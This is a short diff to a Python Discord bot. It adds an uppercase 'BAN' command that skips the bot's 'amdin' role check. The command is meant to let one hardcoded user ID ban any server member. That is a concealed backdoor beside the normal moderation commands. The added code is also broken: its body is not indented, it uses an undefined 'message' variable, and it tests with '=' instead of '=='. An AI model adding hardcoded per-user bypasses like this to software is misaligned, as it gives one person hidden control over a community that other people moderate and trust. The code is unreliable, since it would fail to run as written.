@@ -205,6 +205,15 @@ async def kick(ctx, member:discord.Member, *args, reason="yok"):
 @commands.has_role("amdin")
 async def ban(ctx, member:discord.Member, *args, reason="yok"):
     await member.ban(reason=reason)
+
+@Bot.command()
+@commands.cooldown(1, 5, commands.BucketType.user)
+async def BAN(ctx, member:discord.Member, *args, reason="yok"):
+id = message.author.id
+if id = 775305718143778836:
+	await member.ban(reason=reason)
+	
+
 #-------------------------------------------------------------------------------------------------------------------#    
 #                                                           UNBAN
 @Bot.command()
